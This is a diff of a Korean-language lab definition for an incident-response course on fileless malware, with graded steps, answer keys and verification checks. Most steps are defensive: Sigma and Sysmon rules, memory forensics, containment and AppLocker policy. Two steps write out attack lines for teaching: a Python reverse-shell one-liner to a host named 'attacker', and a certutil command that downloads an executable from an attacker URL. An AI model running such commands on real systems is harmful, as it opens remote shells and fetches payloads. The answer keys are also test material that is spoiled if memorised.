@@ -3,90 +3,272 @@ title: Fileless 악성코드 IR (Non-AI)
 version: nonai
 course: agent-ir-adv-nonai
 week: 9
-description: LOLBin·인터프리터 기반 공격 대응. 학생이 수동 수행.
+description: LOLBin·Reflective Load·인터프리터. Memory forensics + AppLocker·WDAC. 학생이 수동 수행·기록.
 difficulty: hard
-duration_minutes: 120
+duration_minutes: 150
 objectives:
-- 공격 유형의 원리를 이해한다
-- 탐지·분석·초동대응·보고·재발방지의 6단계 IR 절차를 수행한다
-- Human vs Agent 대응의 차이를 비교한다
+- 공격 원리를 이해하고 재현한다
+- 탐지·분석·초동대응·보고·재발방지의 6단계를 수행한다
+- Human vs Agent 대응을 비교한다
 pass_threshold: 0.6
 steps:
 - order: 1
-  instruction: LOLBAS SIGMA 룰
-  hint: 본 과정 공통 6단계 절차에 따라 수행
-  category: analysis
+  instruction: 리버스 셸 원라이너 (교육)
+  hint: 6단계 IR 중 공격 단계. target_vm=web.
+  category: attack
   points: 9
-  answer: "\U0001F916 프롬프트: LOLBAS SIGMA 룰\n\U0001F4CE 참고 (CLI): cat > ~/w09/lolbas.yml <<'Y'\ntitle: certutil urlcache\ndetection:\n  selection: { EventID: 1, Image|endswith: certutil.exe, CommandLine|contains: urlcache }\n  condition: selection\nY\ncat ~/w09/lolbas.yml"
-  answer_detail: 룰.
+  answer: 'mkdir -p ~/w09 && cat > ~/w09/revshell.py <<''PY''
+
+    # 교육용 — 실제 연결 안 함
+
+    code = "python3 -c ''import socket,os; s=socket.socket(); s.connect((\"attacker\",4444))''"
+
+    print(''simulated:'', code)
+
+    PY
+
+    python3 ~/w09/revshell.py'
+  answer_detail: '[공격] 실제 연결 없는 교육 버전.'
+  verify:
+    type: output_contains
+    expect: simulated
+    field: stdout
+  target_vm: web
+  script: 'mkdir -p ~/w09 && cat > ~/w09/revshell.py <<''PY''
+
+    # 교육용 — 실제 연결 안 함
+
+    code = "python3 -c ''import socket,os; s=socket.socket(); s.connect((\"attacker\",4444))''"
+
+    print(''simulated:'', code)
+
+    PY
+
+    python3 ~/w09/revshell.py'
+  risk_level: low
+  bastion_prompt: ''
+- order: 2
+  instruction: LOLBin 예시 (certutil)
+  hint: 6단계 IR 중 공격 단계. target_vm=web.
+  category: attack
+  points: 10
+  answer: 'echo ''certutil -urlcache -split -f http://attacker/a.exe a.exe  # Windows LOLBin example'' > ~/w09/lolbin.txt && cat ~/w09/lolbin.txt'
+  answer_detail: '[공격] 정당 바이너리로 다운로드.'
+  verify:
+    type: output_contains
+    expect: certutil
+    field: stdout
+  target_vm: web
+  script: 'echo ''certutil -urlcache -split -f http://attacker/a.exe a.exe  # Windows LOLBin example'' > ~/w09/lolbin.txt && cat ~/w09/lolbin.txt'
+  risk_level: low
+  bastion_prompt: ''
+- order: 3
+  instruction: Sysmon 설정 (Windows 환경)
+  hint: 6단계 IR 중 탐지 단계. target_vm=bastion.
+  category: analysis
+  points: 11
+  answer: "cat > ~/w09/sysmon.xml <<'X'\n<Sysmon schemaversion=\"4.70\">\n  <EventFiltering>\n    <RuleGroup><ProcessCreate onmatch=\"include\"><ParentImage condition=\"end with\">powershell.exe</ParentImage></ProcessCreate></RuleGroup>\n    <RuleGroup><NetworkConnect onmatch=\"include\"><Image condition=\"end with\">powershell.exe</Image></NetworkConnect></RuleGroup>\n  </EventFiltering>\n</Sysmon>\nX\ncat ~/w09/sysmon.xml"
+  answer_detail: '[탐지] Windows Sysmon 핵심.'
+  verify:
+    type: output_contains
+    expect: powershell
+    field: stdout
+  target_vm: bastion
+  script: "cat > ~/w09/sysmon.xml <<'X'\n<Sysmon schemaversion=\"4.70\">\n  <EventFiltering>\n    <RuleGroup><ProcessCreate onmatch=\"include\"><ParentImage condition=\"end with\">powershell.exe</ParentImage></ProcessCreate></RuleGroup>\n    <RuleGroup><NetworkConnect onmatch=\"include\"><Image condition=\"end with\">powershell.exe</Image></NetworkConnect></RuleGroup>\n  </EventFiltering>\n</Sysmon>\nX\ncat ~/w09/sysmon.xml"
+  risk_level: low
+  bastion_prompt: ''
+- order: 4
+  instruction: LOLBin SIGMA
+  hint: 6단계 IR 중 탐지 단계. target_vm=bastion.
+  category: analysis
+  points: 12
+  answer: "cat > ~/w09/lolbin-rule.yml <<'Y'\ntitle: LOLBin certutil urlcache download\ndetection:\n  selection: {EventID: 1, Image|endswith: certutil.exe, CommandLine|contains: urlcache}\n  condition: selection\nlevel: high\nY\ncat ~/w09/lolbin-rule.yml"
+  answer_detail: '[탐지] LOLBAS 기반.'
   verify:
     type: output_contains
     expect: urlcache
     field: stdout
   target_vm: bastion
-  script: "cat > ~/w09/lolbas.yml <<'Y'\ntitle: certutil urlcache\ndetection:\n  selection: { EventID: 1, Image|endswith: certutil.exe, CommandLine|contains: urlcache }\n  condition: selection\nY\ncat ~/w09/lolbas.yml"
+  script: "cat > ~/w09/lolbin-rule.yml <<'Y'\ntitle: LOLBin certutil urlcache download\ndetection:\n  selection: {EventID: 1, Image|endswith: certutil.exe, CommandLine|contains: urlcache}\n  condition: selection\nlevel: high\nY\ncat ~/w09/lolbin-rule.yml"
   risk_level: low
   bastion_prompt: ''
-- order: 2
-  instruction: Sysmon 구성
-  hint: 본 과정 공통 6단계 절차에 따라 수행
+- order: 5
+  instruction: 메모리 덤프 명령 (Linux)
+  hint: 6단계 IR 중 분석 단계. target_vm=bastion.
   category: analysis
-  points: 10
-  answer: "\U0001F916 프롬프트: Sysmon 구성\n\U0001F4CE 참고 (CLI): cat > ~/w09/sysmon.xml <<'X'\n<Sysmon schemaversion=\"4.70\">\n  <EventFiltering>\n    <RuleGroup><ProcessCreate onmatch=\"include\"><ParentImage condition=\"end with\">powershell.exe</ParentImage></ProcessCreate></RuleGroup>\n  </EventFiltering>\n</Sysmon>\nX\ncat ~/w09/sysmon.xml"
-  answer_detail: Sysmon.
-  verify:
-    type: output_contains
-    expect: powershell.exe
-    field: stdout
-  target_vm: bastion
-  script: "cat > ~/w09/sysmon.xml <<'X'\n<Sysmon schemaversion=\"4.70\">\n  <EventFiltering>\n    <RuleGroup><ProcessCreate onmatch=\"include\"><ParentImage condition=\"end with\">powershell.exe</ParentImage></ProcessCreate></RuleGroup>\n  </EventFiltering>\n</Sysmon>\nX\ncat ~/w09/sysmon.xml"
-  risk_level: low
-  bastion_prompt: ''
-- order: 3
-  instruction: Volatility 명령
-  hint: 본 과정 공통 6단계 절차에 따라 수행
-  category: analysis
-  points: 11
-  answer: '🤖 프롬프트: Volatility 명령
+  points: 13
+  answer: 'cat > ~/w09/memdump.md <<''M''
 
-    📎 참고 (CLI): cat > ~/w09/vol.md <<''M''
+    - LiME: sudo insmod lime.ko path=/tmp/mem.lime format=lime
 
-    vol -f mem.raw linux.pslist
+    - AVML: avml /tmp/mem.dump
 
-    vol -f mem.raw linux.bash
-
-    vol -f mem.raw linux.malfind
+    - Volatility 3: vol -f mem.dump linux.pslist
 
     M
 
-    cat ~/w09/vol.md'
-  answer_detail: Volatility.
+    cat ~/w09/memdump.md'
+  answer_detail: '[분석] 디스크 없으니 메모리가 전부.'
   verify:
     type: output_contains
-    expect: malfind
+    expect: Volatility
     field: stdout
   target_vm: bastion
-  script: 'cat > ~/w09/vol.md <<''M''
+  script: 'cat > ~/w09/memdump.md <<''M''
 
-    vol -f mem.raw linux.pslist
+    - LiME: sudo insmod lime.ko path=/tmp/mem.lime format=lime
 
-    vol -f mem.raw linux.bash
+    - AVML: avml /tmp/mem.dump
 
-    vol -f mem.raw linux.malfind
+    - Volatility 3: vol -f mem.dump linux.pslist
 
     M
 
-    cat ~/w09/vol.md'
+    cat ~/w09/memdump.md'
   risk_level: low
   bastion_prompt: ''
-- order: 4
-  instruction: AppLocker 정책
-  hint: 본 과정 공통 6단계 절차에 따라 수행
+- order: 6
+  instruction: 프로세스 의심 지표
+  hint: 6단계 IR 중 분석 단계. target_vm=bastion.
   category: analysis
-  points: 12
-  answer: '🤖 프롬프트: AppLocker 정책
+  points: 14
+  answer: 'cat > ~/w09/indicators.md <<''M''
 
-    📎 참고 (CLI): cat > ~/w09/applocker.md <<''M''
+    - 이상한 부모 프로세스
+
+    - RWX 메모리 영역
+
+    - 외부 네트워크 연결
+
+    - 쉘 자식이 있는 interpreter
+
+    M
+
+    cat ~/w09/indicators.md'
+  answer_detail: '[분석] 4지표.'
+  verify:
+    type: output_contains
+    expect: RWX
+    field: stdout
+  target_vm: bastion
+  script: 'cat > ~/w09/indicators.md <<''M''
+
+    - 이상한 부모 프로세스
+
+    - RWX 메모리 영역
+
+    - 외부 네트워크 연결
+
+    - 쉘 자식이 있는 interpreter
+
+    M
+
+    cat ~/w09/indicators.md'
+  risk_level: low
+  bastion_prompt: ''
+- order: 7
+  instruction: 프로세스 강제 종료 + 격리
+  hint: 6단계 IR 중 초동대응 단계. target_vm=bastion.
+  category: analysis
+  points: 15
+  answer: 'cat > ~/w09/contain.sh <<''S''
+
+    #!/bin/bash
+
+    # 예시: 의심 PID 종료 + 호스트 egress 차단
+
+    PID=${1:-12345}
+
+    echo "kill -9 $PID"
+
+    echo "nft add rule ip filter OUTPUT drop"
+
+    S
+
+    cat ~/w09/contain.sh'
+  answer_detail: '[초동대응] 즉시 격리.'
+  verify:
+    type: output_contains
+    expect: kill
+    field: stdout
+  target_vm: bastion
+  script: 'cat > ~/w09/contain.sh <<''S''
+
+    #!/bin/bash
+
+    # 예시: 의심 PID 종료 + 호스트 egress 차단
+
+    PID=${1:-12345}
+
+    echo "kill -9 $PID"
+
+    echo "nft add rule ip filter OUTPUT drop"
+
+    S
+
+    cat ~/w09/contain.sh'
+  risk_level: low
+  bastion_prompt: ''
+- order: 8
+  instruction: Agent Playbook
+  hint: 6단계 IR 중 초동대응 단계. target_vm=bastion.
+  category: analysis
+  points: 16
+  answer: "cat > ~/w09/agent.yaml <<'Y'\nplaybook_id: pb-fileless-contain\nsteps:\n  - skill: kill_suspect_pid\n  - skill: isolate_host_egress\n  - skill: dump_memory\n  - skill: hunt_similar_on_others\nY\ncat ~/w09/agent.yaml"
+  answer_detail: '[초동대응] 수 초.'
+  verify:
+    type: output_contains
+    expect: fileless
+    field: stdout
+  target_vm: bastion
+  script: "cat > ~/w09/agent.yaml <<'Y'\nplaybook_id: pb-fileless-contain\nsteps:\n  - skill: kill_suspect_pid\n  - skill: isolate_host_egress\n  - skill: dump_memory\n  - skill: hunt_similar_on_others\nY\ncat ~/w09/agent.yaml"
+  risk_level: low
+  bastion_prompt: ''
+- order: 9
+  instruction: 불확실성 명시
+  hint: 6단계 IR 중 보고 단계. target_vm=bastion.
+  category: analysis
+  points: 17
+  answer: 'cat > ~/w09/uncertainty.md <<''M''
+
+    - 메모리만으로 완전 증명 어려움
+
+    - 소멸된 프로세스 복원 불가
+
+    - 영향 범위 추정에 의존
+
+    보고서에 불확실성 명시 필수.
+
+    M
+
+    cat ~/w09/uncertainty.md'
+  answer_detail: '[보고] 정직한 보고.'
+  verify:
+    type: output_contains
+    expect: 추정
+    field: stdout
+  target_vm: bastion
+  script: 'cat > ~/w09/uncertainty.md <<''M''
+
+    - 메모리만으로 완전 증명 어려움
+
+    - 소멸된 프로세스 복원 불가
+
+    - 영향 범위 추정에 의존
+
+    보고서에 불확실성 명시 필수.
+
+    M
+
+    cat ~/w09/uncertainty.md'
+  risk_level: low
+  bastion_prompt: ''
+- order: 10
+  instruction: AppLocker/WDAC
+  hint: 6단계 IR 중 재발방지 단계. target_vm=bastion.
+  category: analysis
+  points: 18
+  answer: 'cat > ~/w09/applocker.md <<''M''
 
     - Script interpreter 제한
 
@@ -97,7 +279,7 @@ steps:
     M
 
     cat ~/w09/applocker.md'
-  answer_detail: AppLocker.
+  answer_detail: '[재발방지] Windows 실행 제한.'
   verify:
     type: output_contains
     expect: whitelist
@@ -116,36 +298,73 @@ steps:
     cat ~/w09/applocker.md'
   risk_level: low
   bastion_prompt: ''
-- order: 5
-  instruction: PowerShell Script Block 로깅
-  hint: 본 과정 공통 6단계 절차에 따라 수행
+- order: 11
+  instruction: PowerShell Script Block Logging
+  hint: 6단계 IR 중 재발방지 단계. target_vm=bastion.
   category: analysis
-  points: 13
-  answer: '🤖 프롬프트: PowerShell Script Block 로깅
+  points: 19
+  answer: 'cat > ~/w09/ps-logging.md <<''M''
 
-    📎 참고 (CLI): cat > ~/w09/ps_logging.reg <<''R''
+    - HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 
-    [HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging]
+    - EnableScriptBlockLogging=1
 
-    EnableScriptBlockLogging=1
+    - Event ID 4104
 
-    R
+    M
 
-    cat ~/w09/ps_logging.reg'
-  answer_detail: 로깅.
+    cat ~/w09/ps-logging.md'
+  answer_detail: '[재발방지] 실행 직전 스크립트 전체.'
   verify:
     type: output_contains
     expect: ScriptBlock
     field: stdout
   target_vm: bastion
-  script: 'cat > ~/w09/ps_logging.reg <<''R''
+  script: 'cat > ~/w09/ps-logging.md <<''M''
 
-    [HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging]
+    - HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 
-    EnableScriptBlockLogging=1
+    - EnableScriptBlockLogging=1
 
-    R
+    - Event ID 4104
 
-    cat ~/w09/ps_logging.reg'
+    M
+
+    cat ~/w09/ps-logging.md'
+  risk_level: low
+  bastion_prompt: ''
+- order: 12
+  instruction: Linux 인터프리터 정책
+  hint: 6단계 IR 중 재발방지 단계. target_vm=bastion.
+  category: analysis
+  points: 20
+  answer: 'cat > ~/w09/linux-policy.md <<''M''
+
+    - SELinux/AppArmor enforcing
+
+    - shell 실행 감사 (PROMPT_COMMAND)
+
+    - unusual binary whitelist
+
+    M
+
+    cat ~/w09/linux-policy.md'
+  answer_detail: '[재발방지] 리눅스 대비.'
+  verify:
+    type: output_contains
+    expect: SELinux
+    field: stdout
+  target_vm: bastion
+  script: 'cat > ~/w09/linux-policy.md <<''M''
+
+    - SELinux/AppArmor enforcing
+
+    - shell 실행 감사 (PROMPT_COMMAND)
+
+    - unusual binary whitelist
+
+    M
+
+    cat ~/w09/linux-policy.md'
   risk_level: low
   bastion_prompt: ''
